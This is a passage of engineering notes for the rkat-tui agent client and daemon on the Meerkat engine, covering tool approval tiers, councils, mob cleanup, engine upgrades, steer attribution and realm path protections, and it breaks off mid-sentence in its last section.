### Item 11: a message to another agent is tier 1

`AGENT_SEND_TOOLS` (`send_message`, `send_request`, `send_response`, the
sends that name a `peer_id`) of the native family, whose `peer_id` is the
comms peer id of a live agent other than the caller's, are allowed at
tier 1 (`ApprovalEngine::set_agent_peers`, `Agents::is_agent_peer`: the
mob's record of each agent's endpoint, `MobHandle::member_peer_endpoint`,
whose descriptor carries the peer id). A user deny rule still decides
first; any other send stays reviewed. `reply_to_peer` names no peer and
stays reviewed. Test:
`tests/agents.rs::a_message_to_another_agent_is_tier_one_and_any_other_send_asks`
(manual mode: the send to the other agent asks nothing and arrives; a
send to an unknown peer id asks).

### Item 12: `peers` during a `delegate`, and `spawn_member` helpers

Probed on the daemon rig (a scripted agent delegates, the helper calls
`peers`): the helper's `peers` lists the delegating agent
(`tui/main/main-…`, `source: trusted`, sendable kinds message, request
and response), so a `delegate` helper is wired to the agent that
delegated. In the same run the agent's own `list_members` answered an
empty list and `peers` an empty list (it was the only agent), the
`list_members` observation of item 21. `spawn_member` helpers in the
`tui` mob are attributed to the spawning agent already: the customizer
resolves the owner from the spawn's `spawner_identity`
(`HelperRegistry::owner_for_spawn`) and registers the helper under it,
which is what the client's helper filter reads; not changed.

### Item 19: flow tools

Probed: the agent's catalog offers `mob_list_flows`, `mob_run_flow`,
`mob_flow_status` and `mob_cancel_flow` (the member operator tools), and
`mob_list_flows` answers `access_denied` ("Tool 'mob_list_flows' is not
allowed by policy"). That refusal is the engine's (the mob tool layer's
visibility and admission), not rkat-tui's deny list (which names only
`brain_swap`, `apply_patch` and `fork_off`) nor the gate. Decided: the
gate classifies `mob_list_flows` and `mob_flow_status` as tier 1 and
leaves `mob_run_flow` and `mob_cancel_flow` reviewed with the other
mutating `mob_*` tools; the engine's refusal stays, since flows need a
mob definition that declares them, which the daemon's `tui` mob does not
(its one profile is the orchestrator's). Covered by
`upstream_builtins_are_all_classified`'s read-only tier check.

### Item 20: `read_only` with `comms`

The daemon's event watcher sees each `ToolCallRequested`; a
`mob_create`, `mob_profile_create` or `mob_profile_update` whose arguments
hold tool settings with both `read_only` and `comms` true gets the agent a
system note (`READ_ONLY_COMMS_NOTE`) that the profile's members cannot
send messages. The note lands at the agent's next turn boundary, as
every appended note does. Tests:
`daemon::agents::tests::a_read_only_profile_with_comms_is_found_wherever_it_is`,
`tests/mobs.rs::a_read_only_profile_with_comms_gets_the_agent_a_note`.

### Background shell jobs (item 9): withheld, the engine ask recorded

Reproduced on the rig: `shell {"background": true}` answers "tool
execution contract resolution failed: requested tool execution mode
Detached is not supported" while the shell's own schema offers
`background`. The schema is the tell: the shell lists `background` only
while its job manager `exports_canonical_async_ops` (meerkat-tools
`builtin/shell/tool.rs`), so the member's job manager has its durable job
runtime (realm id, a persistent job store, a persistent blob store, the
delivery projector) and its ops binding; the probe
`bootstrap::assemble` → `PersistenceBundle` confirmed the first four are
there (manifest realm, `producer_job_store().is_persistent()`,
`blob_store().is_persistent()`). The refusal is not the shell's: the
agent validates every resolved plan against the root dispatcher's catalog
(`AgentToolDispatcher::validate_resolved_execution_plan`, meerkat-core
`agent.rs`), and a composite (`ToolGateway`, `DynamicToolComposite`)
or a filter rebuilds each part's entries from the bare tool definitions,
without their execution contracts, when that part does not declare its
catalog exact (`tool_catalog_capabilities().exact_catalog`, default
`false`). One inexact part anywhere below makes every ancestor inexact,
so the shell's `Detached` contract was gone by the root.

Which parts, found by switching them off one at a time on the rig (a
probe build of the customizer, not kept): with the mob category disabled
(`ToolCategoryOverrides::mob`) the same call is accepted ("Durable shell
job submitted with ID: job_…", restart class `non_resumable`); disabling
memory, schedules, the work graph, the tool access policy, the
application tool policy, the dispatch admission or our external tools
changes nothing while the mob tools are on. With the mob tools off but
this crate's own external dispatchers left at the default, it fails
again: those were ours (`FileToolDispatcher`, `NoteToolDispatcher`,
`WatchToolDispatcher`, `ReadOnlyProjectTools`), and they now declare
their fixed catalogs exact (`tools::fixed_catalog`). The engine's two are
`meerkat_mob_mcp::AgentMobToolSurface` (`delegate`, `mob_*`, `council`,
`fork_off`) and `meerkat_mob`'s `MobOperatorToolDispatcher` (the member
operator family, `spawn_member` …), which the mob mounts into every
member's external tools (`compose_external_tools_for_profile`); neither
overrides `tool_catalog_capabilities`. A wrapper over the mob tools
factory declaring the surface exact was tried and does not help: the
operator dispatcher sits inside the external tools, where nothing of
ours reaches it. (The same loss drops the tool-owned deadlines
`AgentMobToolSurface::tool_catalog` gives `fork_off` and `council`.)

So the engine cannot run a detached shell for a daemon agent (every agent
has the mob tools). Landed: the three job tools are withheld from every
member and helper through the tool access policy
(`approval::policy::SHELL_JOB_TOOLS`, beside `TUI_OWNED_BUILTINS`), and
the gate refuses `shell` with `background` and any job tool that reaches
it as `Tier::Unavailable` with `DenyReason::Unavailable`
(`BACKGROUND_SHELL_UNAVAILABLE`: what is unavailable and to run the
command in the foreground with `timeout_secs`), never a safety verdict.
For an agent the engine's own refusal comes first (plan resolution runs
before the dispatch admission, and no host hook reaches a member's
build); a helper without the mob tools resolves the background plan and
meets the gate's refusal. The personas say the shell runs in the
foreground only, since the shell's schema still offers `background`.

Engine ask: `AgentMobToolSurface` and `MobOperatorToolDispatcher` declare
`exact_catalog: true` (both build their catalog from a fixed tool set),
or the composites keep each entry's contract when rebuilding an inexact
part. Then lift the gate's refusal and the withholding, and prove the
rest of the brief (the job's end reaches the agent and the TUI, jobs die
with retirement and with daemon stop).

Tests: `tests/shell_jobs.rs::a_background_shell_is_refused_and_the_job_tools_are_withheld`
(the job tools are not offered, the shell's schema offers `background`,
the engine's refusal, nothing ran, the foreground call after it ran;
pins the engine state),
`a_helpers_background_shell_is_refused_by_the_gate`;
`approval::policy::tests::tier_table`, `upstream_builtins_are_all_classified`,
`bootstrap::persona::tests::the_persona_restates_no_tool_contract`.

### Councils (item 17): participants work for the session that convened them

Probed on the rig (an agent makes a mob `team` with two members and
convenes them, `tests/councils.rs`): the engine creates the council's
temporary mob `council--<council id>` through the ordinary create path
with an owner bridge session of its own (`SessionId::new()` in
`meerkat_mob_mcp::temporary_council`'s `seat_participants`; the create
request's docs say so: "a session of its own for a temporary council"),
and seats each participant (a fork of a named member, identity
`council-p<order>`, profile `council_p<order>`) with
`SpawnSource::AttachedForkedParticipant` and no spawner identity. The
create hook recorded that fresh session as the mob's owner, the
customizer resolved the participant's owner from it, and no session here
had it: "attached spawn failed: … helper refused: session … is neither a
session of this TUI nor a helper" (`OwnerError::UnknownSession`); the
council ended `participant_seating_failed` and destroyed its mob.

Nothing in the create request or the spawn names the convener, but the
council id is derived from the call: the call's `council_id` when it
names one, else `agent-` and a UUIDv5 of `"{convening session}:{call
id}"` in the engine's `AGENT_COUNCIL_NAMESPACE` (`agent_council_id`,
`meerkat_mob_mcp::agent_tools`). So the gate records it:
`mobs::council::Convening` wraps every member's dispatch admission (the
agent's `RootGate` and each helper's gate) and, once a `council` call is
admitted, records the mob the engine will create as convened by the
dispatching session (`HelperRegistry::expect_council`); the create hook's
`record_mob` then records that session as the mob's owner instead of the
engine's. The participants resolve to the convener like any helper:
gated for its owner (its transcript, allow cache and Stop), bound and
followed, their catalogs read when their runs end. The client follows the
council's mob too: its follower computes the same mob id from the
`council` call it sees on the agent's (or a helper's) stream
(`Followers::convening`) and opens it as one of the agent's. A council
mob nobody convened through the gate keeps the engine's owner and its
participants are refused, as before.

The council runs in the background (its tool answers "running" with a
job id); its end reaches the agent as a background-job notice
("Background council job … finished") that starts a turn, and the
council destroys its temporary mob itself (the report's
`temporary_mob_destroyed: true`).

Tests: `tests/councils.rs::a_two_member_council_completes_with_its_participants_as_helpers`
(the council's notice is not a failure and carries the participants'
views; a participant's reviewed `shell` went through the classifier with
the agent's transcript and ran; the client saw both participants' events
scoped to them; a drift of the derived id fails it),
`a_council_mob_nobody_convened_here_gets_no_participant` (negative:
`UnknownSession`); unit: `mobs::council::tests`,
`mobs::registry::tests::a_council_works_for_the_session_that_convened_it_and_no_other`,
`client::helpers::tests::a_council_the_agent_convenes_is_followed`.

### `mob_destroy` (item 18): a client's open mob stream held the database

The in-harness agent reported every `mob_destroy` failing with "the
observer drain refused: 5 owner handle(s) still observe this mob
database" (`SqliteMobObserverDrainRefused::OtherOwners`, meerkat-mob
`store/sqlite.rs`). The engine's storage cleanup (`MobMcpState`'s
`settle_owed_storage_cleanup`) waits for the mob's actor to end, then
retries the drain ten times 100 ms apart, running the host's
after-destroy hook before each retry, and removes the database only once
no owner is left in the process.

Probed on the rig. The agent's own `mob_create`, `mob_spawn_member` and
`mob_destroy` (a member with an initial message, so the daemon's
follower subscribed to it and the gate's catalog read ran) destroyed the
mob and removed `mob--team.db` in every variant tried: no member, an idle
member, the destroy while the member's first turn ran, two members, a
later turn, and the mob restored by a later daemon. Counted with
`SqliteMobStores::drain_observers` while the mob runs (a refusal changes
nothing): six to eight owners, the mob's own runtime, stores and member
handles plus the daemon's follower, all gone within the retry window.

It reproduced with a council (item 17): the council's own cleanup
destroys its temporary mob, and the cleanup reported "destroy failed: …
the observer drain refused: 5 owner handle(s)", the same five, leaving
`temporary_mob_destroyed: false`. One holder at a time, by switching it
off in a probe build: without the daemon's follower of the participants
(`mobs/follow.rs`) still five; without the client following the council's
mob (no mob-wide `mob/stream_open` on it) none, and the cleanup
succeeded. So all five are the engine's subscription behind one client
connection's mob-wide stream (its forwarder and the handle and stores it
holds). The client closes a stream only when the stream ends, and the
engine ends it only after the cleanup, which refuses while it is open:
the client follows the agent's implicit mobs and, now, its councils,
which is why the agent saw it on every destroy of those.

Fixed on our side: `HelperRegistry::mob_destroyed` (the after-destroy
hook) reports each destroyed mob (`destroyed_mobs`), and each
connection's proxy (`daemon::serve`, `MobStreams`) remembers the client's
mob-wide stream opens and their stream ids and, on the report, closes
that mob's streams on the client's behalf (`mob/stream_close`, its
answer kept from the client; the engine then sends the client the
stream's `mob/stream_end` as for a close of its own). The hook runs
again before each retry, so a stream opened late is closed too. The
client's read loop reads with `next_line`, which loses nothing when the
report wins the `select!`. None of the five is left to the engine.

Tests: `tests/councils.rs::a_two_member_council_completes_with_its_participants_as_helpers`
(the council's report says `temporary_mob_destroyed: true`; it said
false before this, with the client following the mob),
`tests/mob_destroy.rs::the_agent_destroys_a_mob_it_made_and_its_database_goes`,
`a_mob_restored_by_a_later_daemon_is_destroyed_with_its_database`;
unit: `daemon::serve::tests::a_destroyed_mobs_streams_are_closed_for_the_client`.

## The second senior review's batch R2 (2026-11-11)

### The `rkat/*` wire is paired at compile time (R2 item 7)

Each of the daemon's own methods is one type in
`daemon::protocol::method`, declared once by the `methods!` table with
its name, parameters and result (`protocol::Method`: `NAME`, `Params`,
`Result`). The daemon's `Local::call` dispatches on those declarations
(one arm per method: the parameters are read as the method's, the
handler's value must be the method's result or the arm does not
compile), and the client calls `client::remote::call::<M>(connection,
&params) -> M::Result`; the string constants and the hand-picked result
type of `remote::local::<P, R>(name, …)` are gone. `{}` is
`protocol::Empty`. Where one name answered two shapes it is two methods
now: `rkat/schedules` lists, `rkat/schedule` acts (pause, resume,
delete), as one method can have one result.

Folding, as the review proposed, was looked at with the methods added
since and not done: `rkat/get_mode` is read on every approval note and is
cheap, `rkat/report` reads trust records and the watches; `rkat/status`
serves `--list`, `/agents` and the attach notice; `rkat/notices` is read
once per daemon while `rkat/missed` consumes what it answers on every
attach. The three per-conversation reads (`transcript`, `usage`,
`endpoint`) are read at different points of an attach: the usage read
must follow the stream open and precede draining the notifications that
arrived meanwhile (a turn that ended before it is in the totals), so
one call returning all three would either read the transcript twice or
move the usage read. `decision/decide` stays the engine's method (the
daemon decides it on its own route, `Routed::Decide`).

Tests: `daemon::protocol::tests::the_methods_have_distinct_local_names`;
the wire tests in `tests/daemon.rs` and the rig's calls are unchanged in
what they assert (they call through `remote::call` now).

### `/quit` is decided in the daemon (R2 item 6)

The client read `rkat/status`, ran `quit_decision` on it and then sent
`rkat/retire` or `rkat/shutdown`, neither of which checked anything
again: a client binding to the agent in between was retired out from
under its user, and two clients of one agent quitting together both read
"another client works with it" and both left it to the other.
`rkat/quit` (`protocol::method::Quit`) decides with the same rules
(`daemon::lifecycle::quit_decision`, moved from the client) and acts,
under `Agents::seating` (the lock every bind, seat and retire takes):
it leaves the agent to its other clients, retires it (its schedules
deleted with it, as P6 made `rkat/retire` do; `Agents::retire_seated`
does the retire under the held lock), stops the daemon with every agent
retired, or answers what to ask (the schedules named, as before). A
client that leaves stops counting at once (`Lifecycle::leave` and
`Agents::left`, through the connection's `Caller::leaving` token, so its
seat's and binding's ends count nothing again), so a `/quit` decided
right after it sees it gone. The UI's `QuitDecision` now says what the
daemon did; only `Ask` is followed by a departure (`rkat/detach` or
`rkat/shutdown`); `Departure::Retire` is gone. A quit whose answer never
came (the connection dropped) is taken as a stop only when the daemon's
endpoint file says it ended, as the shutdown was before.

Tests: `tests/lifecycle.rs::two_clients_quitting_at_once_get_one_decision_for_their_agent`
(exactly one of the two leaves; before, both did), the quit tests there
(`quit_stops_the_daemon_this_client_started`,
`quitting_one_of_two_agents_retires_it_and_the_last_quit_stops_the_daemon`,
`the_quit_decision_follows_the_rules` against the daemon's function),
`tests/schedules.rs` (a quit retires the agent and deletes its schedule),
`daemon::local::tests::quitting_names_the_agents_schedules`,
`ui::tests::dispatch::an_attached_quit_asks_the_runner_and_follows_its_decision`.

### The client never awaits the wire in its loop (R2 item 4)

`AttachRunner::handle_effect` awaited `start_turn`, `steer`, `set_mode`,
`status_report`, the rule and trust commands, `/agents` (list and
switch), `/audit`, `/schedules`, `/daemon stop`, `/quit`, the departure,
`/rehome`, `/remember` and an edited `/memory` inline, each bounded only
by its call's timeout (15 s), and the `select!` loop took no other
effect meanwhile: the Esc behind a slow `mob/member_send` waited for it.
Every one of them now does its synchronous part in the loop and makes
its call from a task of its own, which tells the UI itself (a notice) or
reports back (`Report::Sent`, `AgentsRead`, `StopAsked`, `QuitDecided`,
`RehomeStopped`, `Rehomed`, with the link epoch, as the switches already
did). Two orderings the inline awaits gave for free are kept explicitly:
prompts and steers go through one task in the order they were made
(`AttachRunner::outbound`: a steer must not reach the agent before its
prompt), and a steer is expected at the agent's next boundary from the
moment it is sent (`Turn::steers`; taken back when the send fails),
since the stream may deliver it before the send's answer arrives. A
prompt's send failure ends only the turn it was sent for (`Turn::id`).
The departure (`/detach`, terminate after the dialog) is done once the
loop ends, where nothing waits behind it. A re-home runs in two halves
and marks the runner `rehoming`, so the end of the daemon it stopped is
not taken for a lost connection. `Interrupt` stays synchronous; its
stop or cancel was already a task.

Not done here: the `RecallQueued` round trip (Up on an empty input
answers `RECALL_UNAVAILABLE`) stays as it is; it gets wired to a daemon
`rkat/recall` when Meerkat 0.9.12 is adopted
(`.handover/release-adoption-brief.md` 3.2).

Test: `client::runner::tests::no_effect_waits_on_a_daemon_that_does_not_answer`
(a daemon that answers nothing after the attach: every effect returns
within 2 s, the prompt's turn runs and Esc interrupts it, the steer is
expected; before, the first prompt held the loop for the call's 15 s).

### The client's runner, split by concern (R2 item 8)

`client/runner.rs` (4,992 lines after item 4) is the module
`client/runner/`: `mod.rs` keeps the types, the loop, the effect
dispatch and the reports (1,210 lines without its tests), and the rest
of `Runner`'s methods live by concern in `link.rs` (connecting and the
attach's catch-up, losing and re-making the link, notifications,
following the helper mobs; 1,000), `turn.rs` (prompts and steers, Esc,
the agent's events, the model; 645), `switch.rs` (conversation, agent
and workspace switches; 700), `depart.rs` (`/quit`, the departure,
`/daemon stop`; 364) and `commands.rs` (the daemon's own commands and
their texts; 514). The data types stay in `mod.rs`, so the modules share
their fields; a method another module calls is `pub(super)`. Moved, not
changed: every test's assertions are as they were (its imports name the
modules now). `AttachRunner` is `Runner` and `AttachConfig` is
`ClientConfig`; "attach mode" is gone from the code's comments (there is
no other mode; `AttachMode` is still the `--attach` flag's). The
"not attached" texts, 17 hand-written variants, come from one helper
(`Runner::unattached`, `link_or_say`) that says why there is no
connection (connecting, reconnecting, retrying, failed with `/daemon
start` to try again, or stopped) and what did not happen. The
`RecallQueued` round trip is left as it is: it gets wired to a daemon
`rkat/recall` when Meerkat 0.9.12 is adopted
(`.handover/release-adoption-brief.md` 3.2).

### Item 10 of the first review, finished, and the module graph (R2 item 10)

- The realm `tui.toml` writer left the approval engine:
  `config::RealmFile { path, trust }` writes the rules, the permission
  mode and the checklist view, each write recorded in the host trust
  record. Bootstrap makes it, the engine is handed it for the rules and
  the mode (`ApprovalConfig::realm_file`, replacing `rules_path` and
  `rules_trust`), and the daemon keeps one for `rkat/checklist_view`,
  which no longer goes through the engine
  (`ApprovalEngine::persist_checklist_view` is gone).
- The settings the UI renders and the daemon applies are `config`'s:
  `config::settings` holds `ChecklistView`, `HelperView`, `CompactMode`,
  `CompactionPolicy` (its data and the trigger) and `CompactionTrigger`;
  `ui` re-exports what it renders and keeps the gauge's own reading of the
  policy (`describe`, `zone`) as an `impl` beside the gauge. `config`
  imports nothing of `ui` now. (`ScheduleRow::cost` still carries the
  UI's `SessionCost` on the wire.)
- The daemon imports nothing of the client: `rkat/tasks`' reader is
  `daemon::tasks` (from `workbench::tasks`), `/resume`'s reference
  resolution is `daemon::conversations::resolve` (the client re-exports
  it as `client::sessions::resolve`), `local_host` is `paths::local_host`,
  `--list` is `client::list` (it is a client of each daemon; the
  `rkat-tui-mob --list` entry calls it from the crate root,
  `run_daemon`), and the realm-pin test moved to `client::launch`.
- The workbench imports nothing of the client: `AgentContext` holds a
  `ContextSink` (the client's connection, `client::runner::Linked`) and
  answers a typed `ContextError` (not attached, or not taken).
- `tests/layout.rs` keeps `CLAUDE.md`'s layout table naming every
  module directory and top-level module file; the table names
  `agents.rs`, `peer.rs`, `persona.rs`, `settings.rs`, `tasks.rs` and
  `list.rs` where they live now.

## The engine moves to crates.io 0.9.13 (2026-11-11)

Every `meerkat-*` line names `version = "0.9.13"`; `cargo update -p
meerkat` moved the engine crates of the lock together and nothing else.
Upstream calls the release packaging-only, and the published sources
agree: against 0.9.12, every engine crate rkat-tui compiles differs only
in `Cargo.toml`, `Cargo.lock`, `BUILD.bazel` and `.cargo_vcs_info.json`,
apart from an embedded skill text in the facade and the version strings
in `meerkat-contracts`' generated schema. API drift: none (`cargo check
--all-targets --all-features` compiled unchanged). `rmcp` is still 1.8.0,
so the RUSTSEC-2026-0462 ignore still matches (`cargo deny check` passes
with `unused-ignored-advisory = "deny"`); its reason names 0.9.13 now.
`tool_costs::an_agent_s_request_carries_every_tool_definition` still
passes: the members' catalog is still inexact (lukacf/meerkat#2180 is
not in this release).

## The engine moves to crates.io 0.9.12 (2026-11-11)

Every `meerkat-*` dependency names `version = "0.9.12"` from crates.io;
`cargo update -p meerkat` moved all 39 engine crates of the lock together
(upstream pins its own crates exactly), and with them `rusqlite` 0.37 →
0.41.1 (`libsqlite3-sys` 0.39.1, bundled SQLite 3.54.1, `rsqlite-vfs` and
`sqlite-wasm-rs` added); `reqwest` 0.13.5 and `wasm-streams` left the lock
(`meerkat-mcp` no longer compiles rmcp's reqwest client). The release
delta upstream is 304 commits over 486 files (`v0.9.11..v0.9.12`); in the
engine sources rkat-tui compiles against, the changes are in
`meerkat-core` (`lifecycle/run_primitive.rs`, the `xhigh` effort alias),
`meerkat-mob` (the member-send admission plumbing), `meerkat-mob-mcp`
(`public_mcp.rs`), `meerkat-tools` (the protected paths of `apply_patch`
and `blob_save_file`), the facade (`factory.rs`, `host_confinement.rs`,
`surface/schedule_host.rs`), `meerkat-contracts` (`MobMemberSendResult`
gains `admission`), the runtime (the terminal-row CAS and the audit
archive) and `meerkat-models` (the `claude-fable-5-2` row).

API drift: none. `cargo check --all-targets --all-features` compiled
unchanged; rkat-tui builds `MobMemberSendResult` nowhere, has no direct
`rusqlite` dependency (it calls only
`meerkat_sqlite::disable_memory_statistics_at_process_start`, kept), and
`REQUIRED_LIBSQLITE3_FLAGS` is the same string, so `.cargo/config.toml`
stays.

What the release carries for rkat-tui, and where each is taken up:

- `mob/member_send` answers the input it admitted (engine ask 6,
  lukacf/meerkat#2155): steers are attributed by input id, and a sent
  message can be taken back again (the two sections after this one).
- The engine's file tools refuse `.rkat` and the host's declared inputs:
  "The engine's file tools protect the realm" below.
- Claude Fable 5.2 in the catalog: `[thinking]` validation already asks
  the catalog, so `"claude-fable-5-2" = { enabled = N }` is dropped at
  start with a notice and `"adaptive"` passes; the manual's `[thinking]`
  paragraph says so, and
  `thinking::tests::claude_fable_5_2_takes_only_adaptive_thinking` pins
  both. As `[auto] classifier_model` it builds (temperature is stripped,
  tool choice is never forced) but always thinks, so stage 1's 32-token
  budget leaves no room for the verdict; that was already true of Opus
  5.5 and Fable 5.1, and no start-up notice was added for it. The catalog has no
  prices for it; they come from `[pricing]`, LiteLLM or the community
  list as for any model.
- The auth-store handle (lukacf/meerkat#2149): the authority uses the
  newest still-open handle, so "one store handle per realm per process"
  (P4's engine facts) is fixed; the daemon keeps its single handle.
- The terminal-row CAS (`meerkat-runtime` `driver/persistent.rs`,
  `input_audit.rs`): a run that recorded an authorization audit
  observation after its terminal rows settled only after a restart, and
  unregistering its session failed with it. rkat-tui had no recorded
  symptom; recorded as a fix that may have been latent.
- `xhigh`/`x_high` effort alias: rkat-tui sets no effort (a future
  `/effort` would). Copilot model ids, `rkat auth profile`, Meta harvest
  and Intel macOS are not used here. MCP OAuth discovery is bounded at
  1 MiB, which applies to the user's MCP servers for free.
- `deny.toml`: the RUSTSEC-2026-0459 ignore is removed and the 0462 one
  rewritten ("cargo-deny in CI", updated).

Engine asks after the move (`docs/mob-split.md`, "Open engine asks"):
ask 6 shipped; 1 (same-identity rewind), 4 (`delegate` naming the
helper's session), 5 (`host_root` on `mob/spawn`) and 8 (Linux
`deny_write`) are not in 0.9.12; 3 needs no engine change; 2 and 7 stay
withdrawn. None of the evidence index's other open asks shipped.

## Steers are attributed by input id (2026-11-11)

Engine ask 6, shipped in Meerkat 0.9.12 (lukacf/meerkat#2155): an unkeyed
`mob/member_send` answers `admission { session_id, input_id }`, the id the
member's runtime admitted, which `BoundaryAppendApplied.input_id` names
when the input joins the run. `client::remote::send` now decodes the answer
as `MobMemberSendResult` and returns that id; the runner files each steer
under it (`client::runner::steers::Steers`) and marks it delivered only at
its own input's event. The stream is not ordered with the call, so an
event that names an input no steer is filed under yet is kept, and the
answer that names it delivers at once; another client's input is kept the
same way and never matches. The follow-up-run and turn-end sweeps stay: a
steer that misses the boundary rides the next run, whose start names no
input.

Observed on the rig with two clients steering one gated turn: the engine
applied A's steer (admitted first) at the tool boundary and ran B's as a
follow-up run of its own. B's client used to mark its steer at A's event;
now it marks it at the follow-up run's start.

Decisions:

- An answer without `admission` is not matched first in, first out (no
  compatibility code: no older daemon is supported). The runtime has the
  message, so the steer is acknowledged and shown delivered at once with a
  warning (`turn::UNNAMED_INPUT`) rather than returned to the editor, which
  would send it twice. The orchestrator is always runtime-backed, so the
  daemon always names it; `attach::member_send_names_the_admitted_input`
  fails if an engine change stops that, for a prompt into an idle agent
  and a steer into a running turn.
- `BoundaryAppendsDiscarded` changes no mark. The engine's contract
  (`meerkat-core` `event.rs`) is that a discarded application is redelivered
  in exactly one follow-up turn, so "not delivered, back in the editor"
  would put the text in twice; the transcript keeps the notice it already
  showed ("taken back out of the stopped step; the runtime delivers them
  again").

Tests: `attach::each_client_marks_only_its_own_steer_delivered` (each
client's one mark sits right before its own input's event or its
follow-up run, and nothing is marked at the other client's event; a
first-in-first-out `Steers` fails it, checked by mutating the match),
`attach::member_send_names_the_admitted_input`,
`client::runner::tests::a_steers_answer_files_it_under_its_input` and the
`client::runner::steers` unit tests.

## Taking back a sent message again (`rkat/recall`, 2026-11-11)

The deleted in-process runner recalled a queued steer by its input id
(`input_state`, then `cancel_input_if_present` only for a `Queued` input);
the daemon client could not, because `mob/member_send` answered no id, and
answered every recall with `RECALL_UNAVAILABLE`. With 0.9.12's
`admission.input_id` (previous section) the client has the id, and the
daemon serves the recall:

- `rkat/recall { input_ids } -> { recalled, reached, foreign, errors }`
  (`daemon::protocol::method::Recall`, `Local::recall`). It reads each
  input in the **caller's bound agent's current conversation only**, so
  another agent's input (or another conversation's, or a made-up id) is
  `foreign` and never touched; a probe bound to no agent is refused with
  `NO_AGENT`. A `Queued` input is abandoned with the reason
  `rkat-tui: recalled by the user`; any other state is `reached` and
  nothing is cancelled (`cancel_input_if_present` would interrupt that
  input's run). An unknown id is reported, not an error for the call.
- `session/input_status` stays outside the proxy's `SERVED` list: the
  recall has to run in the daemon under the caller's binding anyway. Its
  0.9.12 `by: "idempotency_key"` fix does not apply (rkat-tui's sends are
  unkeyed).
- The runner sends the admitted ids of the steers not applied yet
  (`Steers::outstanding`) and answers `Msg::Recalled` with the steers the
  daemon took back; the UI plumbing (`Effect::RecallQueued`,
  `Msg::Recalled`) was kept for this and is unchanged. `RECALL_UNAVAILABLE`
  is deleted. A steer whose send has not answered yet cannot be named, so
  a recall in that instant reports it reached.
- The remaining window is the in-process runner's: a steer staged between
  the state read and the cancel. The ask for an atomic "abandon these
  inputs if still queued" ("Typing during a slow tool") stays open.

Tests: `client_turns::recalling_a_message_typed_during_a_slow_tool_leaves_the_run_alone`
and `client_turns::recalling_a_steer_that_already_joined_the_run_leaves_it_delivered`
(ported from the in-process runner's), `agents::an_agent_cannot_recall_another_agents_input`
(the binding, an unknown id, the probe's refusal),
`attach::what_the_daemon_cannot_do_yet_says_so` (a recall with nothing
outstanding is an empty answer) and `client::runner::steers::tests::a_recall_takes_only_the_named_inputs`.

## The engine's file tools protect the realm (2026-11-11)

What 0.9.12 refuses (`meerkat-tools` `builtin/utility/protected_paths.rs`,
`apply_patch.rs`, `blob_file.rs`): `apply_patch` and `blob_save_file`
never write a path in a `.rkat` directory at or below their project root
(any letter case, through `..`, absolute paths, symlinks, directories not
created yet), nor through a symlink that leads nowhere, and they refuse
whatever the host declared with `AgentFactory::with_protected_host_inputs`
when it lies strictly inside the project root (applied in every
dispatcher the factory builds). The refusal is an invalid-arguments tool
error.

What rkat-tui declares (`bootstrap::protect_host_inputs`, called by
`build_factory`): `HostConfinement::host_inputs(state_root, user config
document)`, the realm root and rkat-tui's global config directory as
`HostInput::RealmState`, the credential store when the token store is on,
`HostConfinement::realm_documents(realm_root)` and
`HostConfinement::convention_sources(context_root, user_config_root)`.
With the default layout the realm lives under
`~/.rkat/tui/workspaces/<id>/`, outside the project root, so the engine
applies none of it; the declaration matters when `--state-root`,
`--config-dir` or `--user-config-root` put state inside the workspace,
which only `--no-confinement` allows (a confined start refuses with
`TuiError::RealmExposed`).

3.3(b) of the adoption brief, `blob_save_file` meeting the seals at Tier 0,
landed before the move ("`blob_save_file` passes the path seals"). For
3.3(c) the seals now also cover a nested `.rkat` (`**/.rkat`,
`**/.rkat/**` in `SEALED_PATTERNS` and `PROTECTED_PATTERNS`), so rkat-tui's
own `write_file`/`edit_file` and the engine agree. A nested `.rkat` was not
a hole before (it is read only by an `rkat-tui` started with that
directory as its workspace, whose `mcp.toml` and hooks then need `/trust`
by digest), but aligning the two rules costs nothing. rkat-tui's globs
match the name case-sensitively where the engine folds case: a `.RKAT/`
path through `write_file` is judged as an ordinary path, which on a
case-insensitive file system (macOS) is the real `.rkat`. Left open for a
decision (a case-folding seal match).

Tests: `bootstrap::tests::the_engines_file_tools_refuse_the_hosts_state_inside_the_workspace`
(through `build_builtin_dispatcher` and `apply_patch`: a declared
`--state-root` and `--config-dir` inside the workspace, `.rkat/tui.toml`
and `sub/.rkat/mcp.toml` refused, `src/x.rs` written; without the
declaration the first two are written, checked by mutation) and
`paths::tests::sealed_paths_are_the_gate_state_and_vcs_internals_and_imply_protected`
(`a/b/.rkat/mcp.toml` sealed, `a/.rkatx/b` not).

## A steer run as a follow-up run belongs to the turn (2026-11-11)

Hosted CI failed `each_client_marks_only_its_own_steer_delivered` from
7e446af on: client B saw `SteerDelivered(2)`, `TurnFinished`, a status
line, `RemoteTurn` and only then the follow-up `RunStarted` that carried
B's steer. The engine applies the first steer at the tool boundary and
runs the second as a follow-up run after the first run completes; the
client ended a turn `RUN_GRACE` (300 ms) after its last run ended, and
on the slower runner the follow-up run started later than that. The
turn-end sweep then marked B's steer delivered (the runtime owns what is
left at a turn's end; leaving it unmarked would have the UI send it again
as a new prompt), the turn ended, and a new remote turn started with B's
own text. That is a delivery defect, not a test artefact.

The first fix (647a751) kept the turn open only while the client followed
a steer of its own. Hosted CI then failed the same test for client A:
A's steer was applied at the boundary, A followed nothing, and B's
follow-up run, 700 ms after A's run ended, became a second turn on A. A
timer cannot decide this, a longer one only moves the race. The fact
that decides it is in the runtime: `list_active_inputs(session)` names
every input not finished yet (queued, staged, applied and not consumed).
`RunStarted` names no input id and the stream has no admission event, so
a client cannot know of another client's steer; the daemon can.

`rkat/active_inputs` answers how many unfinished inputs the caller's
agent's conversation holds. When every run a client saw ended, it asks;
none held and no steer of its own outstanding ends the turn, otherwise it
asks again every `INPUT_RECHECK` (100 ms) until a run starts or the bound
`FOLLOW_UP_WAIT` (10 s) ends the turn with a notice. A follow-up
`RunStarted` takes this client's steers and marks them right before it is
forwarded; when it carries none of this client's, its text is sent as
`RemoteTurn`, which the UI shows as a user message inside the running
turn. Without a connection (or when the question fails) the old
`RUN_GRACE` rule applies. Remaining limit: a follow-up run that
coalesces this client's steer with another client's shows only the
pending placeholders this client has.

Reproduced locally by running the test with `RUN_GRACE` at 1 ms (a
follow-up that starts later than the grace): the code of 647a751 fails
"one turn, ended once"; the fix passes, four times in a row, with the
answers showing both clients waiting while the runtime held B's input
and ending right after the follow-up.

Tests: `client::runner::tests::a_held_steer_keeps_the_turn_open_for_its_follow_up_run`
(events fed to a runner without a connection: the bound with a steer of
its own, the mark right before the follow-up `RunStarted`, the short
grace once nothing is held) and
